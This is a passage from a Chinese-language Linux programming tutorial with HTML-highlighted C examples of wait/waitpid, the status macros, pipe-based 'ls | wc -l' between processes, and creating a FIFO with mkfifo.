class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pid_t wait(int *status)</span><br><span class="line">成功：清理掉的子进程ID</span><br><span class="line">失败：-1（没有子进程）</span><br></pre></td></tr></table></figure><p>可使用wait函数传出参数status来保存进程的退出状态。借助宏函数来进一步判断进程终止的具体原因，宏函数可分为如下三组</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">WIFEXITED(status) 为非<span class="number">0</span> 进程正常结束</span><br><span class="line">WEXITSTATUS(status) 如上宏为真，使用此宏 获取进程退出状态(<span class="built_in">exit</span>的参数)</span><br><span class="line">  </span><br><span class="line">WIFSIGNALED(status) 为非<span class="number">0</span> 进程异常终止</span><br><span class="line">WTERMSIG(status)如上宏为真，使用此宏 取得使进程终止的那个信号的编号</span><br><span class="line">  </span><br><span class="line">WIFSTOPPED(status) 为非<span class="number">0</span> 进程处于暂停状态</span><br><span class="line">WSTOPSIG(status) 如上宏为真，使用此宏 取得使进程暂停的那个信号的编号</span><br><span class="line">WIFCONTINUED(status) 为真 进程暂停后已经继续运行</span><br></pre></td></tr></table></figure><p>如下代码可以判断子进程的退出状态，并获取相应的状态信号编号</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">pid_t</span> pid,wpid;</span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">int</span> status;</span><br><span class="line"><span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"----child,my myid=%d,going to sleep 10s\n"</span>,getpid());</span><br><span class="line">sleep(<span class="number">10</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"------------child die------------------\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">73</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid&gt;<span class="number">0</span>) &#123;</span><br><span class="line">wpid = wait(&amp;status);</span><br><span class="line"><span class="keyword">if</span> (wpid == <span class="number">-1</span>)&#123;</span><br><span class="line">perror(<span class="string">"wait error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(WIFEXITED(status))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"child exit with %d\n"</span>,WEXITSTATUS(status));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(WIFSIGNALED(status))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"child kill with signal %d\n"</span>,WTERMSIG(status));</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"--------parent wait finish:%d\n"</span>,wpid);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">perror(<span class="string">"fork"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="waitpid函数"><a href="#waitpid函数" class="headerlink" title="waitpid函数"></a>waitpid函数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">waitpid</span><span class="params">(<span class="keyword">pid_t</span> pid,<span class="keyword">int</span> *status,<span class="keyword">int</span> options)</span></span></span><br><span class="line">参数:</span><br><span class="line">  pid:指定回收的子进程pid</span><br><span class="line">    &gt; <span class="number">0</span>:待回收的子进程pid</span><br><span class="line">     <span class="number">-1</span>:任意子进程</span><br><span class="line">      <span class="number">0</span>:同组的子进程</span><br><span class="line">  status:(传出)回收进程的状态</span><br><span class="line">  options:WNOHANG 指定回收方式为，非阻塞</span><br><span class="line">返回值：</span><br><span class="line">  &gt; <span class="number">0</span>:表成功回收的子进程pid</span><br><span class="line">    <span class="number">0</span>:函数调用时，参数<span class="number">3</span>指定了WNOHANG，并且没有子进程结束</span><br><span class="line">   <span class="number">-1</span>:失败。errno</span><br></pre></td></tr></table></figure><p>指定某一个进程进行回收</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">pid_t</span> pid,wpid,tmpid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++) &#123;</span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(i==<span class="number">2</span>) &#123;</span><br><span class="line">tmpid = pid;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"---------pid = %d\n"</span>,tmpid);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(i==<span class="number">5</span>)&#123;</span><br><span class="line"><span class="comment">//sleep(5); //配合WNOHANG 不阻塞</span></span><br><span class="line"><span class="comment">//wpid = waitpid(tmpid,NULL,WNOHANG);//指定一个进程回收，不阻塞</span></span><br><span class="line">wpid = waitpid(tmpid,<span class="literal">NULL</span>,<span class="number">0</span>); <span class="comment">//指定一个进程回收，阻塞回收</span></span><br><span class="line"><span class="keyword">if</span>(wpid == <span class="number">-1</span>)&#123;</span><br><span class="line">perror(<span class="string">"waitpid error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"I'm parent,wait a child finish : %d \n"</span>,wpid);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">sleep(i);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"I'm %dth child,pid=%d\n"</span>,i+<span class="number">1</span>,getpid());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>指定回收所有进程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">pid_t</span> pid,wpid,tmpid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++) &#123;</span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(i==<span class="number">5</span>)&#123;</span><br><span class="line">    <span class="keyword">while</span>((wpid=waitpid(<span class="number">-1</span>,<span class="literal">NULL</span>,WNOHANG))!=<span class="number">-1</span>)&#123; <span class="comment">//使用非阻塞方式回收</span></span><br><span class="line"><span class="keyword">if</span>(wpid &gt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"wait child %d\n"</span>,wpid);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(wpid == <span class="number">0</span>)&#123;</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">sleep(i);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"I'm %dth child,pid=%d\n"</span>,i+<span class="number">1</span>,getpid());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h4><p>内核借助环形队列机制，使用内核缓冲区实现</p><h5 id="pipe函数"><a href="#pipe函数" class="headerlink" title="pipe函数"></a>pipe函数</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int pipe(int fd[2])</span><br><span class="line"></span><br><span class="line">参数：fd[0]:读端</span><br><span class="line">     fd[1]:写端</span><br><span class="line">返回值：成功 0</span><br><span class="line">      失败 -1 error</span><br></pre></td></tr></table></figure><h5 id="pipe函数实现父进程写，子进程读的功能"><a href="#pipe函数实现父进程写，子进程读的功能" class="headerlink" title="pipe函数实现父进程写，子进程读的功能"></a>pipe函数实现父进程写，子进程读的功能</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span>&#123;</span><br><span class="line">    perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"><span class="keyword">int</span> fd[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line"><span class="keyword">char</span> *str = <span class="string">"hello pipe\n"</span>;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line">ret = pipe(fd);</span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">-1</span>)</span><br><span class="line">    sys_err(<span class="string">"pipe error"</span>);</span><br><span class="line">    pid = fork();</span><br><span class="line"><span class="keyword">if</span> (pid&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        close(fd[<span class="number">0</span>]);</span><br><span class="line">write(fd[<span class="number">1</span>],str,<span class="built_in">strlen</span>(str));</span><br><span class="line">close(fd[<span class="number">1</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;</span><br><span class="line">        close(fd[<span class="number">1</span>]);</span><br><span class="line">ret = read(fd[<span class="number">0</span>],buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">write(STDOUT_FILENO,buf,ret);</span><br><span class="line">close(fd[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="父子进程实现ls-wc-l"><a href="#父子进程实现ls-wc-l" class="headerlink" title="父子进程实现ls | wc -l"></a>父子进程实现ls | wc -l</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line"></span><br><span class="line">ret = pipe(fd);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">-1</span>)&#123;</span><br><span class="line">sys_err(<span class="string">"pipe error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">if</span> (pid==<span class="number">-1</span>)&#123;</span><br><span class="line">sys_err(<span class="string">"fork error"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(pid &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        close(fd[<span class="number">0</span>]);</span><br><span class="line">dup2(fd[<span class="number">1</span>],STDOUT_FILENO);</span><br><span class="line">execlp(<span class="string">"ls"</span>,<span class="string">"ls"</span>,<span class="literal">NULL</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line">close(fd[<span class="number">1</span>]);</span><br><span class="line">dup2(fd[<span class="number">0</span>],STDIN_FILENO);</span><br><span class="line">execlp(<span class="string">"wc"</span>,<span class="string">"wc"</span>,<span class="string">"-l"</span>,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="兄弟进程实现ls-wc-l"><a href="#兄弟进程实现ls-wc-l" class="headerlink" title="兄弟进程实现ls | wc -l"></a>兄弟进程实现ls | wc -l</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> ret,i;</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line"></span><br><span class="line">ret = pipe(fd);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">-1</span>)&#123;</span><br><span class="line">sys_err(<span class="string">"pipe error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">2</span>;i++)&#123;</span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">if</span> (pid==<span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"fork error"</span>);</span><br><span class="line"><span class="keyword">if</span>(pid==<span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(i == <span class="number">2</span>)&#123;</span><br><span class="line">close(fd[<span class="number">0</span>]);</span><br><span class="line">close(fd[<span class="number">1</span>]);</span><br><span class="line">wait(<span class="literal">NULL</span>);</span><br><span class="line">wait(<span class="literal">NULL</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(i == <span class="number">0</span>)&#123;</span><br><span class="line">close(fd[<span class="number">0</span>]);</span><br><span class="line">dup2(fd[<span class="number">1</span>],STDOUT_FILENO);</span><br><span class="line">execlp(<span class="string">"ls"</span>,<span class="string">"ls"</span>,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(i==<span class="number">1</span>)&#123;</span><br><span class="line">close(fd[<span class="number">1</span>]);</span><br><span class="line">dup2(fd[<span class="number">0</span>],STDIN_FILENO);</span><br><span class="line">execlp(<span class="string">"wc"</span>,<span class="string">"wc"</span>,<span class="string">"-l"</span>,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="管道的优劣"><a href="#管道的优劣" class="headerlink" title="管道的优劣"></a>管道的优劣</h5><p>优点：简单，相比信号，套接字实现进程间通信，简单的多</p><p>缺点：只能单向通信，双向通信需建立两个管道，只能用于父子，兄弟等有血缘关系之间的通信</p><h4 id="FIFO"><a href="#FIFO" class="headerlink" title="FIFO"></a>FIFO</h4><p>也被称为有名管道</p><h5 id="创建fifo"><a href="#创建fifo" class="headerlink" title="创建fifo"></a>创建fifo</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ret = mkfifo(<span class="string">"mytestfifo"</span>,<span class="number">0644</span>);</span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"mkfifo error"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="fifo实现非血缘关系之间的进程通信"><a href="#fifo实现非血缘关系之间的进程通信" class="headerlink" title="fifo实现非血缘关系之间的进程通信"></a>fifo实现非血缘关系之间的进程通信</h5><p>第一个文件是写入fifo文件的代码<code>fifo_w.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 